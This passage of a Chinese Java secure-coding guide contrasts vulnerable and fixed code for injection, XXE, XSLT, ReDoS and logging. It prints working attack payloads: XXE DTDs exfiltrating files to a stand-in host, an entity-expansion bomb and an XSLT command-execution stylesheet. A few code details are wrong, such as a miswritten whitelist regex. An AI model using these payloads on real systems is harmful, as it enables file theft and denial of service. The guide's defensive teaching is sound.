} catch (SQLException ex) {
    // 处理异常
}
```

上述示例中使用用户提交的用户名和密码构造SQL语句，验证用户名和密码信息是否匹配，通过字符串拼接的方式构造SQL语句，存在SQL注入。恶意用户在仅知道用户名时，通过`zhangsan' OR 'a' = 'a`和**任意密码**的方式就能完成上述代码中的查询。

**【正例】**（使用PreparedStatement进行参数化查询）

```java
PreparedStatement stmt = null;
ResultSet rs = null;
try {
    String userName = request.getParameter("name");
    String password = request.getParameter("password");
    ... // 确保userName和password的长度是合法的
    String sqlStr = "SELECT * FROM t_user_info WHERE name=? AND password =?";
    stmt = connection.prepareStatement(sqlStr);
    stmt.setString(1, userName);
    stmt.setString(2, password);
    rs = stmt.executeQuery();
    ... // 结果集处理
} catch (SQLException ex) {
    // 处理异常
}
```

参数化查询在SQL语句中使用占位符表示需在运行时确定的参数值，使得SQL查询的语义逻辑预先被定义，实际的查询参数值则在程序运行时再确定。参数化查询使得数据库能够区分SQL语句中语义逻辑和数据参数，以确保用户输入无法改变预期的SQL查询语义逻辑。如果攻击者输入userName为`zhangsan' OR 'a' = 'a`，该字符串仅会作为name字段的值来使用。

**【正例】**（对输入输入做转义）

```java
public List<Book> queryBooks(List<Expression> queryCondition) {
    ...
    try {
        StringBuilder sb = new StringBuilder("select * from t_book where ");
        Codec oe = new OracleCodec();
        if (queryCondition != null && !queryCondition.isEmpty()) {
            for (Expression e : queryCondition) {
                String exprString = e.getColumn() + e.getOperator();
                String safeValue = XXXEncoder.encodeForSQL(oe, e.getValue());
                sb.append(exprString).append("'").append(safeValue).append("' and ");
            }
            sb.append("1=1");
            Statement stat = connection.createStatement();
            ResultSet rs = stat.executeQuery(sb.toString());
            ... // 其他代码
        }
    }
    ...
}
```

虽然参数化查询是防止SQL注入最便捷有效的一种方式，但不是SQL语句中任何部分在执行前都能够被占位符所替代，因此，参数化查询无法应用于所有场景。当使用执行前不可被占位符替代的外部数据来动态构建SQL语句时，必须对外部数据进行校验。每种DBMS都有其特定的转义机制，通过这种机制来告诉数据库此输入应该被当作数据，而不应该是代码逻辑。因此，只要输入数据被适当转义，就不会发生SQL注入问题。

**注：**如果传入的是字段名或者表名，建议使用白名单的方式进行校验。

在存储过程中，通过拼接参数值来构建查询字符串，和在应用程序代码中拼接参数一样，同样是有SQL注入风险的。

**【反例】**（在存储过程中动态构建SQL）

SQL Server存储过程：

```sql
CREATE PROCEDURE sp_queryItem
    @userName varchar(50),
    @password varchar(50)
AS
BEGIN
    DECLARE @sql nvarchar(500);
    SET @sql = 'SELECT * FROM t_user_info
                WHERE name= ''' + @userName + '''
                AND password= ''' + @password + '''';
    EXEC(@sql);
END
GO
```

在存储过程中，通过拼接参数值来构建查询字符串，和在应用程序代码中拼接参数一样，同样是有SQL注入风险的。

**【正例】**（在存储过程中进行参数化查询）

SQL Server存储过程：

```sql
CREATE PROCEDURE sp_queryItem
    @userName varchar(50),
    @password varchar(50)
AS
BEGIN
    SELECT * FROM t_user_info
    WHERE name = @userName
    AND password = @password;
END
GO
```

存储过程使用参数化查询，而不包含不安全的动态SQL构建。数据库编译此存储过程时，会生成一个SELECT查询的执行计划，只允许原始的SQL语义被执行，任何参数值，即使是被注入的SQL语句也不会被执行。      

## 禁止使用外部数据构造格式化字符串

**描述】**

Java中的Format可以将对象按指定的格式转为某种格式的字符串，格式化字符串可以控制最终字符串的长度、内容、样式，当格式化字符串中指定的格式与格式对象不匹配时还可能会抛出异常。当攻击者可以直接控制格式化字符串时，可导致信息泄露、拒绝服务、系统功能异常等风险。

**【反例】**

```java
public String formatInfo(String formatStr) {
    String value = getData();
    return String.format(formatStr, value));
}

String formatStr = req.getParameter("format");
String formattedValue = formatInfo(formatStr);
```

上面的示例代码中，直接使用外部指定的格式对字符串进行格式化，当外部指定的格式为非字符类型如%d，会导致格式化操作出现异常。

**【正例】**

```java
public String formatInfo() {
    String value = getData();
    return String.format("my format: %s", value));
}
```

上述示例将用户输入排除在格式化字符串之外。    

## 禁止向Runtime.exec()方法或java.lang.ProcessBuilder类传递外部数据

**【描述】**

`Runtime.exec()`方法或`java.lang.ProcessBuilder`类被用来启动一个新的进程，在新进程中执行命令。命令执行通常会有两种方式：

- 直接执行具体命令： 例如`Runtime.getRuntime().exec("ping 127.0.0.1")`;

直接使用外部数据构造命令行，会存在以下风险：

- 执行命令时，需要命令行解释器对命令字符串进行拆分，该方式可执行多条命令，存在命令注入风险；
- 直接执行具体的命令时，可以通过空格、双引号或以-/开头的字符串向命令行中注入参数，存在参数注入风险。

**外部数据用于构造非shell方式的命令行**

**【反例】**

```java
String cmd = "ping" + ip;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
```

当ip的值为“ 127.0.0.1 -t”的时候，会向实际执行的命令中注入参数“-t”参数，导致ping进程持续执行。

针对命令注入或参数注入，具体的解决方案如下：

1、**避免直接执行命令**

对于Java的标准库或开源组件已经提供的功能，应使用标准库或开源组件的API，避免执行命令。

如果无法避免执行命令，则必须要对外部数据进行检查和过滤。

2、**对外部数据进行校验**

**【正例】**（数据校验）

```java
...
// str值来自用户输入
if (!Pattern.matches("[0-9A-Za-z@]+", str)) {
    // 处理错误
}
...
```

外部数据用于拼接命令行时，可使用白名单方式对外部数据进行校验，保证外部数据中不含注入风险的特殊字符。

3、**对外部数据进行转义**

**【正例】**（转义）

```java
String encodeIp = XXXXEncoder.encodeForOS(new WindowsCodec(), ip);
String cmd = "cmd.exe /c ping " + encodeIp;
Runtime rt = Runtime.getRuntime();
Process proc = rt.exec(cmd);
...
```

在执行命令行时，如果输入校验不能禁止有风险的特殊字符，需先外部输入进行转义处理，转义后的字段拼接命令行可有效防止命令注入的产生。

说明：正确的转义处理只是针对外部输入，而不是拼接后的完整命令行。转义方式只针对命令注入有效，对于参数注入无效。

## 禁止直接使用外部数据来拼接XML

**【描述】**

使用未经校验的数据来构造XML会导致XML注入漏洞。如果用户被允许输入结构化的XML片段，则用户可以在XML的数据域中注入XML标签来改写目标XML文档的结构和内容，XML解析器会对注入的标签进行识别和解释，引起注入问题。

**【反例】**

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    String xmlString;
    xmlString = "<user><role>operator</role><id>" + user.getUserId()
        + "</id><description>" + user.getDescription() + "</description></user>";
    ... // 解析xml字符串
}
```

恶意用户可能会使用下面的字符串作为用户ID：

```
"joe</id><role>administrator</role><id>joe"

```

并使用如下正常的输入作为描述字段：

```
"I want to be an administrator"

```

最终，整个XML字符串将变成如下形式：

```xml
<user>
    <role>operator</role>
    <id>joe</id>
    <role>administrator</role>
    <id>joe</id>
    <description>I want to be an administrator</description>
</user>
```

由于SAX解析器（org.xml.sax and javax.xml.parsers.SAXParser）在解释XML文档时会将第二个role域的值覆盖前一个role域的值，因此会导致此用户角色由操作员提升为了管理员。

**【反例】**（XML Schema或者DTD校验）

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    String xmlString;
    xmlString = "<user><id>" + user.getUserId()
        + "</id><role>operator</role><description>" + user.getDescription()
        + "</description></user>";

    StreamSource xmlStream = new StreamSource(new StringReader(xmlString));

    // 创建一个使用schema执行校验的SAX解析器
    SchemaFactory sf = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
    StreamSource ss = new StreamSource(new File("schema.xsd"));
    try {
        Schema schema = sf.newSchema(ss);
        Validator validator = schema.newValidator();
        validator.validate(xmlStream);
    } catch (SAXException ex) {
        throw new IOException("Invalid userId", ex);
    }

    // XML是有效的, 进行处理
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

如下是schema.xsd文件中的schema定义：

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="user">
        <xs:complexType>
        <xs:sequence>
            <xs:element name="id" type="xs:string"/>
            <xs:element name="role" type="xs:string"/>
            <xs:element name="description" type="xs:string"/>
        </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

某个恶意用户可能会使用下面的字符串作为用户ID：

```
"joe</id><role>Administrator</role><!--"

```

并使用如下字符串作为描述字段：

```
"--><description>I want to be an administrator"

```

最终，整个XML字符串将变成如下形式：

```xml
<user>
    <id>joe</id>
    <role>Administrator</role><!--</id> <role>operator</role> <description> -->
    <description>I want to be an administrator</description>
</user>
```

用户ID结尾处的`<!--`和描述字段开头处的`-->`将会注释掉原本硬编码在XML字符串中的角色信息。虽然用户角色已经被攻击者篡改成管理员类型，但是整个XML字符串仍然可以通过schema的校验。XML schema或者DTD校验仅能确保XML的格式是有效的，而攻击者可以在不打破原有XML格式的情况下，对XML的内容进行篡改。

**【正例】**（白名单校验）

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    // 仅当userID只包含字母、数字和下划线时写入XML字符串
    if (!Pattern.matches("[_a-bA-B0-9]+", user.getUserId())) {
        // 处理错误
    }
    if (!Pattern.matches("[_a-bA-B0-9]+", user.getDescription())) {
        // 处理错误
    }
    String xmlString = "<user><id>" + user.getUserId()
        + "</id><role>operator</role><description>"
        + user.getDescription() + "</description></user>";
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

这个方法使用白名单的方式对输入进行校验，要求输入的userId中只能包含字母、数字或者下划线。

**【正例】**（使用安全的XML库）

```java
public static void  buildXML(FileWriter writer, User user) throws IOException {
    Document userDoc = DocumentHelper.createDocument();
    Element userElem = userDoc.addElement("user");
    Element idElem = userElem.addElement("id");
    idElem.setText(user.getUserId());
    Element roleElem = userElem.addElement("role");
    roleElem.setText("operator");
    Element descrElem = userElem.addElement("description");
    descrElem.setText(user.getDescription());
    XMLWriter output = null;
    try {
        OutputFormat format = OutputFormat.createPrettyPrint();
        format.setEncoding("UTF-8");
        output = new XMLWriter(writer, format);
        output.write(userDoc);
        output.flush();
    } finally {
        // 关闭流
    }
}
```

上述示例中使用Dom4j来构建XML，Dom4j是一个定义良好、开源的XML工具库。Dom4j会对文本数据域进行XML编码，从而使得XML的原始结构和格式免受破坏。

这个例子中，攻击者如果输入如下字符串作为用户ID：

```
"joe</id><role>Administrator</role><!--"

```

以及使用如下字符串作为描述字段：

```
"--><description>I want to be an administrator"

```

则最终会生成如下格式的XML：

```xml
<user>
    <id>joe&lt;/id&gt;&lt;role&gt;Administrator&lt;/role&gt;&lt;!--</id>
    <role>operator</role>
    <description>--&gt;&lt;description&gt;I want to be an administrator</description>
</user>
```

可以看到，“<”与“>”经过XML编码后分别被替换成了 “**\&lt;”**与”**\&gt;**”，导致攻击者未能将其角色类型从操作员提升到管理员。

**【正例】**（编码）

```java
private void createXMLStream(BufferedOutputStream outStream, User user)
    throws IOException {
    ...
    String encodeUserId = XXXXEncoder.encodeForXML(user.getUserId());
    String encodeDec = XXXXEncoder.encodeForXML(user.getDescription());

    String xmlString = "<user><id>" + encodeUserId
        + "</id><role>operator</role><description>" + encodeDec
        + "</description></user>";
    outStream.write(xmlString.getBytes(StandardCharsets.UTF_8));
    outStream.flush();
}
```

上述示例中，对外部数据在拼接XML字符串前进行了编码处理，然后再构造XML字符串，这样就不会导致XML字符串结构被篡改。

## 防止解析来自外部的XML导致的外部实体（XML External Entity）攻击

**【描述】**

XML实体包括内部实体和外部实体。外部实体格式：`<!ENTITY 实体名 SYSTEM "URI"\>`或者`<!ENTITY 实体名 PUBLIC "public_ID" "URI"\>`。Java中引入外部实体的协议包括http、https、ftp、file、jar、netdoc、mailto等。XXE漏洞发生在应用程序解析来自外部的XML数据或文件时没有禁止外部实体的加载，造成任意文件读取、内网端口扫描、内网网站攻击、DoS攻击等危害。

1.利用外部实体的引用功能实现任意文件的读取：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
    <!ENTITY file SYSTEM "file:///c:/xxx/xxx.ini"> ]>
<updateProfile>
    <firstname>Joe</firstname>
    <lastname>&file;</lastname>
    ...
</updateProfile>
```

2.使用参数实体和<CDATA[]>避免XML解析语法错误，构造恶意的实体解析：

XML文件：构造参数实体 % start；% goodies；% end；% dtd定义一个恶意的combine.dtd

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % goodies SYSTEM "file:///etc/fstab">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://evil.example.com/combine.dtd">
    %dtd;
    ]>
<roottag>&all;</roottag>
```

恶意DTD：combine.dtd中定义实体&all;

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```

甚至可以这样构造恶意的combine.dtd，将结果发送到目标地址，最后会获得file:///etc/fstab文件。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % send "<!ENTITY all SYSTEM 'http://mywebsite.com/?%gooddies;'>">
%send;
```

**【反例】**

该示例中对来自外部的XML文件进行解析，没有禁止解析DTDs或者禁止解析外部实体。

```java
private void parseXmlFile(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}
```

上述代码示例中解析XML文件时未进行安全防护，当解析的XML文件是攻击者恶意构造的，系统会受到XXE攻击。

**【正例】**（禁止解析DTDs）

```java
private void parserXmlFileDisableDtds(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}
```

代码中设置禁止解析DTDs属性，该方式不仅可以防止XML的外部实体攻击也能防止XML内部实体攻击。

**【正例】**（禁止解析外部一般实体和外部参数实体）

该代码示例能防止外部实体（XXE）攻击，不能防止XML内部实体攻击。

```java
private void parserXmlFileDisableExternalEntityes(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", false);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}
```

**【正例】**（对外部实体进行白名单校验）

这个示例方法定义一个CustomResolver类来实现接口`org.xml.sax.EntityResolver`。在这个类中实现自定义的处理外部实体机制。自定义实体解析方法中使用一个简单的白名单，在白名单范围内的返回对应的文件内容，否则返回一个空的实体解析内容。

```java
private static void parserXmlFileValidateEntities(String filePath) {
    try {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.setEntityResolver(new ValidateEntityResolver());
        Document doc = db.parse(new File(filePath));
        ... // 解析xml文件中的内容
    } catch (ParserConfigurationException ex) {
        // 处理异常
    }
    ...
}

class ValidateEntityResolver implements EntityResolver {
    private static final String GOOD_ENTITY = "file:/Users/onlinestore/good.xml";

    public InputSource resolveEntity(String publicId, String systemId)
        throws SAXException, IOException {
        if (publicId != null && publicId.equals(GOOD_ENTITY)) {
            return new InputSource(publicId);
        } else if (systemId != null && systemId.equals(GOOD_ENTITY)) {
            return new InputSource(systemId);
        } else {
            return new InputSource();
        }
    }
}
```

当系统中涉及的XML操作中必须使用外部实体时，必须对外部实体进行白名单校验。具体的校验方式如上述代码，自定义一个`ValidateEntityResolver`类（实现接口`org.xml.sax.EntityResolver`），在`resolveEntity`方法中对XML中引入的实体进行白名单校验，拒绝解析非白名单中的外部实体。

备注：XML解析器非常多，不能一一列举。当程序加载来自外部的XML数据时，通过设置对该解析器生效的属性或其他方法达到禁止解析外部实体的目的，通过构建上面示例中有攻击行为的XML内容，查看程序反应来判断设置的属性是否已经生效。

## 防止解析来自外部的XML导致的内部实体扩展（XML Entity Expansion）攻击

**【描述】**

XML内部实体是实体的内容已经在Doctype中声明。内部实体格式：`<!ENTITY 实体名 "实体的值"\>`。内部实体攻击比较常见的是XML Entity Expansion攻击，它主要试图通过消耗目标程序的服务器内存资源导致DoS攻击。外部实体攻击和内部实体扩展攻击有不同的防护措施（禁止DTDs解析可以防护外部实体和内部实体攻击）。

解析下面恶意的XML内部实体，会占用大量服务器内存资源，导致拒绝服务攻击。

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
<lolz>&lol9;</lolz>
```

内部实体扩展攻击**最好的防护措施是禁止DTDs的解析**。也可以对内部实体数量进行限制，以消减内部实体扩展攻击发生的可能性。在不需要使用内部实体时，应该禁止DTDs解析，需要使用内部实体时，严格限制内部实体的数量及XML内容的大小。

**【正例】**（禁止解析DTDs）

```java
public void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

**【正例】**（限制实体解析个数）

Java中的JAXP解析器默认限制实体解析个数是64,000个，但通常不会需要解析这么多的实体个数，可以限制更小的实体解析个数。该代码示例中通过设置DOM解析器的属性限制解析实体个数。

```java
public void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    dbf.setAttribute("http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit",
        "200");
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

备注：属性http://www.oracle.com/xml/jaxp/properties/entityExpansionLimit在JDK 7u45+、JDK 8版本中支持。JAXP中的SAX和StAX类型解析器不支持该属性。

**【正例】**（限制实体解析个数）

该代码示例中通过设置系统属性限制解析实体个数。

```java
public void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {

    // 使用系统属性限制
    System.setProperty("entityExpansionLimit", "200");
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = dbf.newDocumentBuilder();
    db.parse(inStream);
}
```

备注：系统属性entityExpansionLimit在JDK 7u45+、JDK 8版本中支持。JAXP中的SAX和StAX类型解析器同样生效。

有些产品使用Xerces第三方jar包提供的DOM、SAX、StAX类型解析器，该jar包中可以通过设置`setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true)`限制实体个数不能超过100,000个。

**【正例】**（限制解析实体个数）

Xerces包中限制实体解析个数代码。

```java
private static void receiveXMLStream(InputStream inStream)
    throws ParserConfigurationException, SAXException, IOException {
    DocumentBuilderFactory factory = DocumentBuilderFactoryImpl.newInstance();
    factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
    DocumentBuilder db = factory.newDocumentBuilder();
    org.w3c.dom.Document doc = db.parse(inStream);
    doc.getChildNodes();
}
```

备注：XML解析器非常多，不能一一列举。当程序加载来自外部的XML数据时，通过设置对该解析器生效的属性或其他方法达到禁止解析内部实体的目的，通过构建上面示例中有攻击行为的XML内容，查看程序反应来判断设置的属性是否已经生效。

## 禁止使用不安全的XSLT转换XML文件

**【描述】**

XSLT是一种样式转换标记语言，可以将XML数据转换为另外的XML或其他格式，如HTML网页，纯文字。因为XSLT的功能十分强大，可以导致任意代码执行，当使用TransformerFactory转换XML格式数据的时候，需要添加安全策略禁止不安全的XSLT代码执行。

**【反例】**

```java
public void XsltTrans(String src, String dst, String xslt) {
    // 获取转换器工厂
    TransformerFactory tf = TransformerFactory.newInstance();
    try {
        // 获取转换器对象实例
        Transformer transformer = tf.newTransformer(new StreamSource(xslt));

        // 进行转换
        transformer.transform(new StreamSource(src),
            new StreamResult(new FileOutputStream(dst)));
        ...
    } catch (TransformerException ex) {
        // 处理异常
    }
    ...
}
```

这里xslt没有做任何限制，直接调用，当执行类似如下XSLT代码的时候，会导致命令执行漏洞：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="java">
    <xsl:template match="/" xmlns:os="java:lang.Runtime" >
        <xsl:variable name="runtime" select="java:lang.Runtime.getRuntime()"/>
        <xsl:value-of select="os:exec($runtime, 'calc')" />
    </xsl:template>
</xsl:stylesheet>
```

**【正例】**

```java
public void xsltTrans(String src, String dst, String xslt) {
    // 获取转换器工厂
    TransformerFactory tf = TransformerFactory.newInstance();
    try {
        // 转换器工厂设置黑名单，禁用一些不安全的方法，类似XXE防护
        tf.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);

        // 获取转换器对象实例
        Transformer transformer = tf.newTransformer(new StreamSource(xslt));

        // 去掉<?xml version="1.0" encoding="UTF-8"?>
        transformer.setOutputProperty("omit-xml-declaration", "yes");

        // 进行转换
        transformer.transform(new StreamSource(src),
            new StreamResult(new FileOutputStream(dst)));
        ...
    } catch (TransformerException ex) {
        // 处理异常
    }
    ...
}
```

TransformerFactory可以添加安全策略防护，Java对xslt内置了黑名单，这里通过将[http://javax.xml.XMLConstants/feature/secure-processing属性设置为true开启防护，可以禁用一些不安全的方法。](http://javax.xml.xmlconstants/feature/secure-processing属性设置为true开启防护，可以禁用一些不安全的方法。)  

## 正则表达式应该尽量简单，防止ReDos攻击

**【描述】**

ReDos攻击是正则编写不当导致的常见安全风险。Java中提供的正则匹配使用的是NFA引擎。NFA引擎的回溯机制，导致当字符串文本与正则表达式不匹配时，所花费的时间要比匹配时多。即要确定匹配失败，需要与所有可能的路径进行对比匹配，证明都不匹配时，才返回匹配失败。当使用简单的非分组正则表达式时，一般不会存在ReDos攻击。容易存在ReDos攻击的正则表达式主要有两类：

1、 包含具有自我重复的重复性分组的正则，例如：
`^(\d+)+$`
`^(\d*)*$`
`^(\d+)*$`
`^(\d+|\s+)*$`

2、 包含替换的重复性分组，例如：
`^(\d|\d|\d)+$`
`^(\d|\d?)+$`

对于ReDos攻击的防护手段主要包括：

- 进行正则匹配前，先对匹配的文本的长度进行校验；
- 在编写正则时，尽量不要使用过于复杂的正则，尽量少用分组，例如对于正则`^(([a-z])+\.)+[A-Z]([a-z])+$`（存在ReDos风险），可以将多余的分组删除：`^([a-z]+\.)+[A-Z][a-z]+$`，这样在不改变检查规则的前提下消除了ReDos风险；
- 避免动态构建正则，当使用外部数据构造正则时，要使用白名单进行严格校验。

**【反例】**

```java
private static final Pattern REGEX_PATTER = Pattern.compile("a(b|c+)+d");

public static void main(String[] args) {
    ...
    Matcher matcher = REGEX_PATTER.matcher(args[0]);
    if (matcher.matches()) {
        ...
    } else {
        ...
    }
    ...
}
```

上述示例代码中，正则表达式`a(b|c+)+d`存在ReDos风险，当匹配的字符串格式为”accccccccccccccccx”时，随中间的字符”c”的增加，代码执行时间将成指数级增长。

**【正例】**

```java
private static final Pattern REGEX_PATTER = Pattern.compile("a[bc]+d");

public static void main(String[] args) {
    ...
    Matcher matcher = REGEX_PATTER.matcher(args[0]);
    if (matcher.matches()) {
        ...
    } else {
        ...
    }
    ...
}
```

上述代码中，将正则表达式精简为`a[bc]+d`，可以在实现相同功能的前提下消除ReDos风险。

**【反例】**

```java
String key = request.getParameter("keyword");
...
String regex = "[a-zA-Z0-9_-]+@" + key + "\\.com";
Pattern searchPattern = Pattern.compile(regex);
...
```

上面的代码示例中，使用外部指定的keyword构造正则，当外部输入中使用了重复性分组，可能会导致最终的正则存在ReDos风险。在实际开发代码过程中，应避免直接使用外部数据构造正则或直接使用外部数据作为正则使用。

## 禁止直接使用外部数据作为反射操作中的类名/方法名

**【描述】**

反射操作中直接使用外部数据作为类名或方法名，会导致系统执行非预期的逻辑流程（Unsafe Reflection）。这可被恶意用户利用来绕过安全检查或执行任意代码。当反射操作需要使用外部数据时，必须对外部数据进行白名单校验，明确允许访问的类或方法列表；另外也可以通过让用户在指定范围内选择的方式进行防护。

**【反例】**

```java
String className = request.getParameter("class");
...
Class objClass = Class.forName(className);
BaseClass obj = (BaseClass) objClass.newInstance();
obj.doSomething();
```

上述代码示例中，直接使用外部指定的类名通过反射构造了一个对象，恶意用户可利用此处构造一个任意的`BaseClass`子类的对象，当恶意用户可控制`BaseClass`的某个子类时，则可在该子类的`doSomething()`方法中执行任意代码。另外恶意用户还可以利用此代码执行任意类的默认构造方法，即使在进行类型转换时抛出`ClassCastException`，恶意用户预期的构造方法中的代码也已经执行。

**【正例】**

```java
String classIndex = request.getParameter("classIndex");
String className = (String) reflectClassesMap.get(classIndex);
if (className != null) {
    Class objClass = Class.forName(className);
    BaseClass obj = (BaseClass) objClass.newInstance();
    obj.doSomething();
} else {
    throw new IllegalStateException("Invalid reflect class!");
}
...
```

上述示例代码中，外部只能指定要反射的类的代号，当代号可映射为一个指定的类名时，执行反射操作，否则判断为非法参数。

# 日志

#### 禁止直接使用外部数据记录日志

**【描述】**

直接将外部数据记录到日志中，可能存在以下风险：

- 日志注入：恶意用户可利用回车、换行等字符注入一条完整的日志；
- 敏感信息泄露：当用户输入敏感信息时，直接记录到日志中可能会导致敏感信息泄露；
- 垃圾日志或日志覆盖：当用户输入的是很长的字符串，直接记录到日志中可能会导致产生大量垃圾日志；当日志被循环覆盖时，这样还可能会导致有效日志被恶意覆盖。

所以外部数据应尽量避免直接记录到日志中，如果必须要记录到日志中，要进行必要的校验及过滤处理，对于较长字符串可以截断。对于记录到日志中的数据含有敏感信息时，对于秘钥、口令类的敏感信息，将这些敏感信息替换为固定长度的*，对于其他类的敏感信息（如手机号、邮箱等），先进行匿名化处理。

**【反例】**

```java
String jsonData = getRequestBodyData(request);
if (!validateRequestData(jsonData)) {
    LOG.error("Request data validate fail! Request Data : " + jsonData);
}
```

上述代码中，当请求的json数据校验失败，会直接将json字符串记录到日志中，当json字符串中含有敏感信息，会导致敏感信息泄露的风险，当恶意用户向json字符串中通过回车换行符注入伪造的日志会造成日志注入问题，当json字符串比较长时，会导致日志冗余。

**【正例】**

外部数据记录到日志中前，将其中的\r\n等导致换行的字符进行替换，消除注入风险。如下代码为其中一种实现方式：

```java
public String replaceCRLF(String message) {
    if (message == null) {
        return "";
    }
    return message.replace('\n', '_').replace('\r', '_');
}
```

#### 禁止在日志中记录口令、密钥等敏感信息

**【描述】**

在日志中不能记录口令、密钥等敏感信息，包括这些敏感信息的加密密文，防止产生敏感信息泄露风险。若因为特殊原因必须要记录日志，应用固定长度的星号（*）代替这些敏感信息。

**【反例】**

```java
private static final Logger LOGGER = Logger.getLogger(TestCase1.class);
...
LOGGER.info("Login success, user is " + userName + ", password is " +
    encrypt(pwd.getBytes(StandardCharsets.UTF_8)));
```

**【正例】**

```java
private static final Logger LOGGER = Logger.getLogger(TestCase1.class);
...
LOGGER.info("Login success, user is " + userName + ", password is ********.");
```

# 性能和资源管理

#### 进行IO类操作时，必须在try-with-resource或finally里关闭资源

**【描述】**

申请的资源不再使用时，需要及时释放。而在产生异常时，资源释放常被忽视。因此要求在IO、数据库操作等需要显式调用关闭方法如`close()`释放资源时，必须在try-catch-finally的finally中调用关闭方法。如果有多个IO对象需要`close()`，需要分别对每个对象的`close()`方法进行try-catch，防止一个IO对象关闭失败导致其他IO对象都未关闭，保证产生异常时释放已申请的资源。

Java 7有自动资源管理的特性try-with-resource，不需手动关闭。它优先于try-finally，这样得到的代码将更加简洁、清晰，产生的异常也更有价值。特别是对于多个资源或异常时，try-finally可能丢失掉前面的异常，而try-with-resource会保留第一个异常，并把后续的异常作为Suppressed exceptions，可通过`getSuppressed()`返回的数组来检验。

try-finally也常用于`lock()`和`unlock()`等场景。

**【正例】**

```java
try (FileInputStream in = new FileInputStream(inputFileName);
    FileOutputStream out = new FileOutputStream(outputFileName)) {
    copy(in, out);
}
```

# 其他

#### 全场景下必须使用密码学意义上的安全随机数

**【描述】**

不安全的随机数可能被部分或全部预测到，导致系统存在安全隐患，安全场景下使用的随机数必须是密码学意义上的安全随机数。密码学意义上的安全随机数分为两类：

- 真随机数产生器产生的随机数；
- 以真随机数产生器产生的少量随机数作为种子的密码学安全的伪随机数产生器产生的大量随机数。

Java中的`SecureRandom`是一种密码学安全的伪随机数产生器，对于使用非真随机数产生器产生随机数时，要使用少量真随机数作为种子。

常见安全场景包括但不限于以下场景：

